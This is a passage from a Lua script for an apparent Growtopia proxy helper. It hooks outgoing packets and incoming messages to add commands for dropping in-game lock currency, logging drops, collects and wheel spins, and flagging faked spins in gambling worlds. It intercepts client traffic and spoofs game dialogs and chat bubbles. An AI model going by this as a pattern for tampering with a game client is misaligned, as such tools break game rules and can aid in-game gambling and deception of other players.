Log|left|1436|\nadd_spacer|small|\ntext_scaling_string|textscalingstring|\nadd_button_with_icon|CLEAR_SPIN_LOG|"..D.LOG.ADDITIONAL.CLEAR.."|staticBlueFrame|4940|\nadd_button_with_icon|FILTER_BY_REAL_SPIN|"..D.LOG.ADDITIONAL.REAL.."|staticBlueFrame|4938|\nadd_button_with_icon|FILTER_BY_FAKE_SPIN|"..D.LOG.ADDITIONAL.FAKE.."|staticBlueFrame|4936|\nadd_button_with_icon|SHOW_REME_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_REME.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_REME).."|2836|\nadd_button_with_icon|SHOW_QEME_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_QEME.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_QEME).."|2838|\nadd_button_with_icon||END_LIST||0||\nadd_button_with_icon|SHOW_UID_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_UID.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_UID).."|10794|\nadd_button_with_icon|SHOW_WORLD_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_WORLD.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_WORLD).."|3802|\nadd_button_with_icon|SHOW_TIME_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_TIME.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_TIME).."|1482|\nadd_button_with_icon|SHOW_PEME_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_PEME.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_PEME).."|2840|\nadd_button_with_icon|SHOW_LEME_ON_SPIN|"..D.LOG.ADDITIONAL.SHOW_LEME.."|"..FRAME(V.LOG.ADDITIONAL.SHOW_LEME).."|2842|\nadd_button_with_icon||END_LIST||0||\nadd_smalltext|Click the Roulette Wheel icon to filter the spin by user or player|\n"..table.concat(SL).."\nadd_spacer|small|\nadd_quick_exit|\nadd_button|HOSTER_MENU|Back|noflags|0|0|\nend_dialog|SPIN_LOG|||")}) end

-- // Dialog

function DIALOG_MAIN_MENU() A = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|"..D.MAIN_MENU.TEXT.TITLE.."|left|3524|\nadd_smalltext|"..D.MAIN_MENU.TEXT.SPACE.."|\nadd_smalltext|"..D.MAIN_MENU.TEXT.DESC_1.." `"..V.UI.SECONDARY.."Starries`"..V.UI.PRIMARY..", "..D.MAIN_MENU.TEXT.DESC_2.."|\nadd_smalltext|"..D.MAIN_MENU.TEXT.SPACE.."|\nadd_label_with_icon|small|"..D.MAIN_MENU.TEXT.HI.." "..GetLocal().name.."|left|7232|\nadd_label_with_icon|small|"..D.MAIN_MENU.TEXT.WORLD.." `"..V.UI.SECONDARY..""..GetWorld().name.."|left|3802|\nadd_label_with_icon|small|"..D.MAIN_MENU.TEXT.STAND.." `"..V.UI.PRIMARY.."X : `"..V.UI.SECONDARY.."".. math.floor(GetLocal().pos.x // 32)  .. "`"..V.UI.PRIMARY..", Y : `"..V.UI.SECONDARY.."" .. math.floor(GetLocal().pos.y // 32)  .. "|left|4472|\nadd_label_with_icon|small|"..D.MAIN_MENU.TEXT.DATETIME.." : `"..V.UI.SECONDARY..""..D.MAIN_MENU.TEXT.TIME.."|left|1482|\nadd_smalltext|"..D.MAIN_MENU.TEXT.SPACE.."|\nadd_label_with_icon|small|"..D.MAIN_MENU.TEXT.FEATURE.." :|left|11304|\nadd_spacer|small|\ntext_scaling_string|textscalingstring|\nadd_button_with_icon|SOCIAL_PORTAL|"..D.MAIN_MENU.BUTTON.SOCIAL.."|staticBlueFrame|1366|\nadd_button_with_icon|COMMAND_LIST|"..D.MAIN_MENU.BUTTON.COMMAND.."|staticBlueFrame|1752|\nadd_button_with_icon|ABILITY_MENU|"..D.MAIN_MENU.BUTTON.ABILITY.."|staticBlueFrame|"..GetItemInfo("Dumb Roles Icon").id.."|\nadd_button_with_icon|LIST_MENU|"..D.MAIN_MENU.BUTTON.LIST_MENU.."|staticBlueFrame|4856|\nadd_button_with_icon|SPAM_EDITOR|"..D.MAIN_MENU.BUTTON.SPAM.."|staticBlueFrame|12436|\nadd_button_with_icon|INFORMATION|"..D.MAIN_MENU.BUTTON.INFO.."|staticBlueFrame|7074|\nadd_button_with_icon||END_LIST||0||\nadd_quick_exit|\nend_dialog|MAIN_MENU|"..D.MAIN_MENU.BUTTON.CLOSE.."||" DIALOG(A, 500) end

AddHook("OnSendPacket", "PACKET-MAIN", function(A, B) if B == nil then return end local VALUE, BUTTON, TOGGLE = SPLIT(B:gsub("action|input\n|text|", ""), " "), B:match("buttonClicked|(%S+)"), B if VALUE == nil or VALUE[1] == nil or VALUE == "" or VALUE[1] == "" then return end COMMAND = VALUE[1]:lower()
if COMMAND == ("/menu") or COMMAND == ("/proxy") or B:match("action|friends") or BUTTON == ("BACK_TO_MAIN_MENU") then DIALOG_MAIN_MENU() return true end
if COMMAND == ("/sosial") or COMMAND == ("/portal") or COMMAND == ("/social") or BUTTON == ("SOCIAL_PORTAL") then SendPacket(2,"action|friends") return true end
if COMMAND == ("/friendlist") or COMMAND == ("/friends") or COMMAND == ("/friend") then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|friendlist") return true end
if COMMAND == ("/minigames") or COMMAND == ("/minigame") then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|games") return true end
if COMMAND == ("/lb") or COMMAND == ("/leaderboard") then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|leaderboard") return true end
if COMMAND == ("/guild") then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|guild") return true end
if COMMAND == ("/trades") or COMMAND == ("/trade") and not VALUE[2] then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|trades") return true end
if COMMAND == ("/activity") then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|activity") return true end
if COMMAND == ("/lottery") then SendPacket(2,"action|dialog_return\ndialog_name|social\nbuttonClicked|lottery") return true end
if COMMAND == ("/security") or COMMAND == ("/secure") then SendPacket(2,"action|dialog_return\ndialog_name|popup\nbuttonClicked|security") return true end
return false end)

AddHook("OnSendPacket", "PACKET-HOSTER", function(T, S) if S == nil then return end local VALUE, BUTTON, TOGGLE = SPLIT(S:gsub("action|input\n|text|", " "), " "), S:match("buttonClicked|(%S+)"), S if VALUE == nil or VALUE[1] == nil or VALUE == "" or VALUE[1] == "" then return end COMMAND = VALUE[1]:lower()
if COMMAND == "/taunt" then CHAT("Tazz Tazz Tazz Dulu (dance)") return true end

if COMMAND == "/reme" then if V.HOSTER.REME_MODE == nil or V.HOSTER.REME_MODE == false then V.HOSTER.REME_MODE = true CONSOLE("Reme Mode `2Enabled") else V.HOSTER.REME_MODE = false CONSOLE("Reme Mode `4Disabled") end return true end
if COMMAND == "/qeme" then if V.HOSTER.QEME_MODE == nil or V.HOSTER.QEME_MODE == false then V.HOSTER.QEME_MODE = true CONSOLE("Qeme Mode `2Enabled") else V.HOSTER.QEME_MODE = false CONSOLE("Qeme Mode `4Disabled") end return true end
if COMMAND == "/peme" then if V.HOSTER.PEME_MODE == nil or V.HOSTER.PEME_MODE == false then V.HOSTER.PEME_MODE = true CONSOLE("Peme Mode `2Enabled") else V.HOSTER.PEME_MODE = false CONSOLE("Peme Mode `4Disabled") end return true end
if COMMAND == "/leme" then if V.HOSTER.LEME_MODE == nil or V.HOSTER.LEME_MODE == false then V.HOSTER.LEME_MODE = true CONSOLE("Leme Mode `2Enabled") else V.HOSTER.LEME_MODE = false CONSOLE("Leme Mode `4Disabled") end return true end

if COMMAND == "/cbgl" then if CHANGE_BGL_MODE == nil or CHANGE_BGL_MODE == false then CHANGE_BGL_MODE = true CONSOLE("Change BGL `2Enabled") else CHANGE_BGL_MODE = false CONSOLE("Change BGL `4Disabled") end return true end

if COMMAND == ("/wl") then if VALUE[3] ~= nil then OPTION = VALUE[3]:lower() if OPTION:find("x(%d+)") then TIMES = tonumber(OPTION:match("x(%d+)")) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(242) < tonumber(VALUE[2]*TIMES) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]*TIMES) DROP(242, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]*TIMES).." `9World Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `9World Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `9World Lock") end end end return true end if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(242) < tonumber(VALUE[2]) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]) DROP(242, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]).." `9World Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `9World Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `9World Lock") end end return true end 
if COMMAND == ("/dwl") then if GET_AMOUNT(242) <= 0 then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP(242, GET_AMOUNT(242)) CONSOLE("Dropped `w"..GET_AMOUNT(242).." `9World Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(242).." `9World Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(242).." `9World Lock") end end return true end 
if COMMAND == ("/dl") then if VALUE[3] ~= nil then OPTION = VALUE[3]:lower() if OPTION:find("x(%d+)") then TIMES = tonumber(OPTION:match("x(%d+)")) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(1796) < tonumber(VALUE[2]*TIMES) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]*TIMES) DROP(1796, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]*TIMES).." `1Diamond Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `1Diamond Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `1Diamond Lock") end end end return true end if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(1796) < tonumber(VALUE[2]) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]) DROP(1796, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]).." `1Diamond Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `1Diamond Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `1Diamond Lock") end end return true end 
if COMMAND == ("/ddl") then if GET_AMOUNT(1796) <= 0 then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP(1796, GET_AMOUNT(1796)) CONSOLE("Dropped `w"..GET_AMOUNT(1796).." `1Diamond Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(1796).." `1Diamond Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(1796).." `1Diamond Lock") end end return true end 
if COMMAND == ("/bl") then if VALUE[3] ~= nil then OPTION = VALUE[3]:lower() if OPTION:find("x(%d+)") then TIMES = tonumber(OPTION:match("x(%d+)")) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(7188) < tonumber(VALUE[2]*TIMES) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]*TIMES) DROP(7188, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]*TIMES).." `eBlue Gem Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `eBlue Gem Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `eBlue Gem Lock") end end end return true end if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(7188) < tonumber(VALUE[2]) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]) DROP(7188, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]).." `eBlue Gem Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `eBlue Gem Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `eBlue Gem Lock") end end return true end 
if COMMAND == ("/dbl") then if GET_AMOUNT(7188) <= 0 then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP(7188, GET_AMOUNT(7188)) CONSOLE("Dropped `w"..GET_AMOUNT(7188).." `eBlue Gem Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(7188).." `eBlue Gem Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(7188).." `eBlue Gem Lock") end end return true end 
if COMMAND == ("/bg") then if VALUE[3] ~= nil then OPTION = VALUE[3]:lower() if OPTION:find("x(%d+)") then TIMES = tonumber(OPTION:match("x(%d+)")) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(11550) < tonumber(VALUE[2]*TIMES) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]*TIMES) DROP(11550, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]*TIMES).." `bBlack Gem Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `bBlack Gem Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]*TIMES).." `bBlack Gem Lock") end end end return true end if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif GET_AMOUNT(11550) < tonumber(VALUE[2]) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP_AMOUNT = tonumber(VALUE[2]) DROP(11550, DROP_AMOUNT) CONSOLE("Dropped `w"..tonumber(VALUE[2]).." `bBlack Gem Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `bBlack Gem Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..tonumber(VALUE[2]).." `bBlack Gem Lock") end end return true end 
if COMMAND == ("/dbg") then if GET_AMOUNT(11550) <= 0 then CONSOLE(D.ALERT.AMOUNT_LESS) return true else DROP(11550, GET_AMOUNT(11550)) CONSOLE("Dropped `w"..GET_AMOUNT(11550).." `bBlack Gem Lock") if V.BUBBLE.DROP_BUBBLE then CHAT(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(11550).." `bBlack Gem Lock") end if V.OVERLAY.DROP_OVERLAY then OVERLAY(V.SYSTEM.CREDIT.."`wDropped "..GET_AMOUNT(11550).." `bBlack Gem Lock") end end return true end 

if COMMAND == ("/daw") then TABLE_DAW = {WL = GET_AMOUNT(242), DL = GET_AMOUNT(1796), BGL = GET_AMOUNT(7188), BLACK = GET_AMOUNT(11550)} if TABLE_DAW.WL == 0 and TABLE_DAW.DL == 0 and TABLE_DAW.BGL == 0 and TABLE_DAW.BLACK == 0 then CONSOLE(D.ALERT.AMOUNT_LESS) return true end DAW = true return true end 

if COMMAND == "/cd" and VALUE[2] and CDROP then CONSOLE(D.ALERT.PLEASE_WAIT) CDROP = false return true elseif COMMAND == "/cd" and VALUE[2] and not CDROP then HAVE_AMOUNT = GET_AMOUNT(242)+(GET_AMOUNT(1796)*100)+(GET_AMOUNT(7188)*10000)+(GET_AMOUNT(11550)*1000000) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif tonumber(VALUE[2]) > math.floor(HAVE_AMOUNT) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else local DROP_AMOUNT = tonumber(VALUE[2]) if not CDROP then CDROP = true else CDROP = false end RunThread(CUSTOM_DROP(DROP_AMOUNT)) end return true elseif COMMAND == "/cd" and not VALUE[2] then CONSOLE("Make sure provide amount to drop by typing like this : /cd <amount>") return true end
if COMMAND == "/dd" and VALUE[2] then HAVE_AMOUNT = GET_AMOUNT(242)+(GET_AMOUNT(1796)*100)+(GET_AMOUNT(7188)*10000)+(GET_AMOUNT(11550)*1000000) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif tonumber(VALUE[2]*100) > math.floor(HAVE_AMOUNT) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else local DROP_AMOUNT = tonumber(VALUE[2]*100) if not CDROP then CDROP = true else CDROP = false end RunThread(CUSTOM_DROP(DROP_AMOUNT)) end return true elseif COMMAND == "/dd" and not VALUE[2] then CONSOLE("Make sure provide amount to drop by typing like this : /dd <amount>") return true end
if COMMAND == "/bd" and VALUE[2] then HAVE_AMOUNT = GET_AMOUNT(242)+(GET_AMOUNT(1796)*100)+(GET_AMOUNT(7188)*10000)+(GET_AMOUNT(11550)*1000000) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif tonumber(VALUE[2]*10000) > math.floor(HAVE_AMOUNT) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else local DROP_AMOUNT = tonumber(VALUE[2]*10000) if not CDROP then CDROP = true else CDROP = false end RunThread(CUSTOM_DROP(DROP_AMOUNT)) end return true elseif COMMAND == "/db" and not VALUE[2] then CONSOLE("Make sure provide amount to drop by typing like this : /db <amount>") return true end
if COMMAND == "/bg" and VALUE[2] then HAVE_AMOUNT = GET_AMOUNT(242)+(GET_AMOUNT(1796)*100)+(GET_AMOUNT(7188)*10000)+(GET_AMOUNT(11550)*1000000) if tonumber(VALUE[2]) == nil then CONSOLE(D.ALERT.AMOUNT_NIL) return true elseif tonumber(VALUE[2]) == 0 then CONSOLE(D.ALERT.AMOUNT_NOL) return true elseif tonumber(VALUE[2]*1000000) > math.floor(HAVE_AMOUNT) then CONSOLE(D.ALERT.AMOUNT_LESS) return true else local DROP_AMOUNT = tonumber(VALUE[2]*1000000) if not CDROP then CDROP = true else CDROP = false end RunThread(CUSTOM_DROP(DROP_AMOUNT)) end return true elseif COMMAND == "/bg" and not VALUE[2] then CONSOLE("Make sure provide amount to drop by typing like this : /bg <amount>") return true end

if COMMAND == "/black" or COMMAND == "/hitam" then if GET_AMOUNT(7188) < 100 then CONSOLE("You don't have enough Blue Gem Lock!") return true else MERGE_BLACK() end return true end 
if COMMAND == "/blue" or COMMAND == "/biru" then if GET_AMOUNT(11550) < 1 then CONSOLE("You don't have enough Black Gem Lock!") return true else SHATTER_BLACK() end return true end 

if COMMAND == "/dp" and VALUE[2] then if tonumber(VALUE[2]) == nil or tonumber(VALUE[2]) == 0 then CONSOLE("Please provide the exact number!") return true else local D = tonumber(VALUE[2]) DEPO(D) end return true elseif COMMAND == "/dp" and not VALUE[2] then CONSOLE("Please provide the deposit amount! Type : /dp <amount>") return true end 
if COMMAND == "/wd" and VALUE[2] then if tonumber(VALUE[2]) == nil or tonumber(VALUE[2]) == 0 then CONSOLE("Please provide the exact number!") return true else local D = tonumber(VALUE[2]) WEDE(D) end return true elseif COMMAND == "/dp" and not VALUE[2] then CONSOLE("Please provide the deposit amount! Type : /dp <amount>") return true end 

if COMMAND == "/log" and VALUE[2] then local ARGS = VALUE[2]:lower() if ARGS == "drop" then DIALOG_DROP_LOG() elseif ARGS == "collect" then DIALOG_COLLECT_LOG() elseif ARGS == "spin" then DIALOG_SPIN_LOG() else CONSOLE("Log Commands that available are 'drop', 'collect', and 'spin'") end return true elseif COMMAND == "/log" and not VALUE[2] then CONSOLE("Log Commands that available are 'drop', 'collect', and 'spin'") return true end

if S:find("dialog_name|DROP_LOG\nbuttonClicked|(%d+)") then FILTER_THIS = tonumber(S:match("dialog_name|DROP_LOG\nbuttonClicked|(%d+)")) FILTER_DROP_LOG(FILTER_THIS) return true end
if BUTTON == "DROP_LOG_MENU" then DIALOG_DROP_LOG() end

if S:find("dialog_name|COLLECT_LOG\nbuttonClicked|(%d+)") then FILTER_THIS = tonumber(S:match("dialog_name|COLLECT_LOG\nbuttonClicked|(%d+)")) FILTER_COLLECT_LOG(FILTER_THIS) return true end
if BUTTON == "COLLECT_LOG_MENU" then DIALOG_COLLECT_LOG() end
return false end)

AddHook("OnVariant", "VARIANT-HOSTER", function(L) 
if L[0] == "OnDialogRequest" and L[1]:find("end_dialog|social") then SendVariantList({[0] = "OnDialogRequest", [1] = L[1]:gsub("(add_button|lottery|`9The Lottery``|noflags|0|0|)", "%1\nadd_button|BACK_TO_MAIN_MENU|`wMain Menu|")}) return true end
if L[0] == "OnDialogRequest" and L[1]:find("add_button|chc0|`wContinue``|noflags|0|0|") then SendVariantList({[0] = "OnDialogRequest", [1] = L[1]:gsub("(add_label|small|`wActive effects:``|left)", "%1\nadd_label_with_icon|small|`wPart of `5Starries Club|left|6322|")}) return true end	

if L[0] == "OnConsoleMessage" and not (L[1]:find("spun the wheel") or L[1]:find("FRIEND ALERT:") or L[1]:find("UPDATE RECOMMENDED") or L[1]:find("`#** `$The Gods`` `ohave") or L[1]:find("Collected  `w(%d+) World Lock") or L[1]:find("Collected  `w(%d+) Diamond Lock") or L[1]:find("Collected  `w(%d+) Blue Gem Lock") or L[1]:find("Collected  `w(%d+) Black Lock")) then CONSOLE(L[1]) return true end

if L[0] == "OnTalkBubble" and L[2]:find("spun the wheel") then
if L[2]:find("``!]``") and not L[2]:find("CP:") then SPLIT_NAME = L[2]:find("spun") - 1 NAME = L[2]:sub(4, SPLIT_NAME) CLEAR_SPACE = L[2]:find("got ") + 6 CS = L[2]:find("``!") - 1 SPUN_NUMBER = L[2]:sub(CLEAR_SPACE, CS)

if V.HOSTER.REME_MODE or V.HOSTER.QEME_MODE or V.HOSTER.PEME_MODE or V.HOSTER.LEME_MODE then SendVariantList({[0] = "OnTalkBubble", [1] = L[1], [2] = "`w[`2REAL`w] ``"..L[2].." "..GET_GAME(SPUN_NUMBER)}) else SendVariantList({[0] = "OnTalkBubble", [1] = L[1], [2] = "`w[`2REAL`w] ``"..L[2]}) end
table.insert(V.LOG.SPIN, {SPIN = "\nadd_label_with_icon_button|small|%s%s`w[`2REAL`w] %s" ..L[2].."%s%s|left|758|"..GET_USER_ID(L[1]).."|\n", UID = "`"..V.UI.PRIMARY.."[`"..V.UI.SECONDARY..""..GET_USER_ID(L[1]).."`"..V.UI.PRIMARY.."] ", USER_ID = GET_USER_ID(L[1]), STATUS = "REAL", WORLD = "[`"..V.UI.SECONDARY..""..GetWorld().name.."`"..V.UI.PRIMARY.."] ", TIME = "[`"..V.UI.SECONDARY..""..os.date("%H:%M:%S").."`"..V.UI.PRIMARY.."] ", REME = " `5REME `w: `5"..REME_COUNT(tonumber(SPUN_NUMBER)).."", QEME = " `6QEME `w: `6"..QEME_COUNT(tonumber(SPUN_NUMBER)), PEME = " `1PEME `w: `1"..PEME_COUNT(tonumber(SPUN_NUMBER)), LEME = " `eLEME `w: `e"..LEME_COUNT(tonumber(SPUN_NUMBER))})

--if L[1] == GetLocal().netid and (SPUN_NUMBER == "0" or SPUN_NUMBER == "19" or SPUN_NUMBER == "28") then SOMBONG_DULU = true end

-- for _, P in pairs(GetPlayerList()) do if P.netid == L[1] then CHAT("/nick ".. FORMAT_NAME(NAME).."["..SPUN_NUMBER.."]") end end
elseif L[2]:find("`.spun") or L[2]:find("`.!]") or L[2]:find("`.]") or (L[2]:find("<") and L[2]:find(">")) then SPLIT_NAME = L[2]:find("spun") - 1 NAME = L[2]:sub(2, SPLIT_NAME) SPUN_NUMBER = L[2]:match("got (.+)!]"):gsub("`.","") WARN("`wWarning from `4Starries Helper `w: Someone typing in your world!") 
CHAT("`w[`8WARNING`w] Someone Doing `4Fake Spin`w, Suspect : "..NAME) --CHAT(NAME.."`wcaught using `4FAKE `wwheel!") 
SendVariantList({[0] = "OnTalkBubble", [1] = L[1], [2] = "`w[`4FAKE`w] ``" ..L[2]}) 
table.insert(V.LOG.SPIN, {SPIN = "\nadd_label_with_icon_button|small|%s%s`w[`4FAKE`w] %s"..L[2].."%s%s|left|758|"..GET_USER_ID(L[1]).."|\n", UID = "`"..V.UI.PRIMARY.."[`"..V.UI.SECONDARY..""..GET_USER_ID(L[1]).."`"..V.UI.PRIMARY.."] ", USER_ID = GET_USER_ID(L[1]), STATUS = "FAKE", WORLD = "[`"..V.UI.SECONDARY..""..GetWorld().name.."`"..V.UI.PRIMARY.."] ", TIME = "[`"..V.UI.SECONDARY..""..os.date("%H:%M:%S").."`"..V.UI.PRIMARY.."] ", REME = " `5REME `w: `5"..REME_COUNT(tonumber(SPUN_NUMBER)).."", QEME = " `6QEME `w: `6"..QEME_COUNT(tonumber(SPUN_NUMBER)), PEME = " `1PEME `w: `1"..PEME_COUNT(tonumber(SPUN_NUMBER)), LEME = " `eLEME `w: `e"..LEME_COUNT(tonumber(SPUN_NUMBER))})

end

return true end

if L[0] == "OnConsoleMessage" and L[1]:find("spun the wheel") then
if L[1]:find("``!]``") and not L[1]:find("CP:") then
SPLIT_NAME = L[1]:find("spun") - 1
NAME = L[1]:sub(4, SPLIT_NAME)
CLEAR_SPACE = L[1]:find("got ") + 6
CS = L[1]:find("``!]") - 1
SPUN_NUMBER = L[1]:sub(CLEAR_SPACE, CS)

if V.HOSTER.REME_MODE or V.HOSTER.QEME_MODE or V.HOSTER.PEME_MODE then CONSOLE("`w[`2REAL`w] `o"..L[1].." "..GET_GAME(SPUN_NUMBER)) else CONSOLE("`w[`2REAL`w] `o"..L[1]) end

for _, P in pairs(GetPlayerList()) do if P.netid == L[1] then CHAT("/nick ".. FORMAT_NAME(NAME).."["..SPUN_NUMBER.."]") end end

elseif L[1]:find("CP:") then NAME = string.sub(L[1], L[1]:find("6<`") + 4, L[1]:find("`>")) CONSOLE("`w[`4FAKE`w] `o"..L[1]) 
end 
return true end

return false end)

AddHook("OnVariant", "VARIANT-COLLECT", function(L) COLLECTED_TABLE = {} if L[0] == "OnConsoleMessage" and L[1]:find("`6<(.+)") then return false end if L[0] == "OnConsoleMessage" and (L[1]:find("Collected  ") and (L[1]:match("Black Gem Lock") or L[1]:match("Blue Gem Lock") or L[1]:match("Diamond Lock") or L[1]:match("World Lock"))) then CONSOLE(L[1]) if L[1]:find("Collected  `w(%d+) Black Gem Lock") then if COLLECTED_BLACK == nil or COLLECTED_BLACK == 0 then COLLECTED_BLACK = 0 end if COLLECTED_BGL == nil or COLLECTED_BGL == 0 then COLLECTED_BGL = 0 end if COLLECTED_DL == nil or COLLECTED_DL == 0 then COLLECTED_DL = 0 end if COLLECTED_WL == nil or COLLECTED_WL == 0 then COLLECTED_WL = 0 end COLLECTED_BLACK = tonumber(L[1]:match("Collected  `w(%d+) Black Gem Lock")) table.insert(COLLECTED_TABLE, {NUM = (COLLECTED_BLACK*1000000)+(COLLECTED_BGL*10000)+(COLLECTED_DL*100)+(COLLECTED_WL)}) table.insert(V.LOG.COLLECT, {COLLECT = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `otook `w"..COLLECTED_BLACK.." Black Gem Lock`o. at "..os.date("%H:%M on %d/%m").."|left|11550|11550|\n", COLLECT_ID 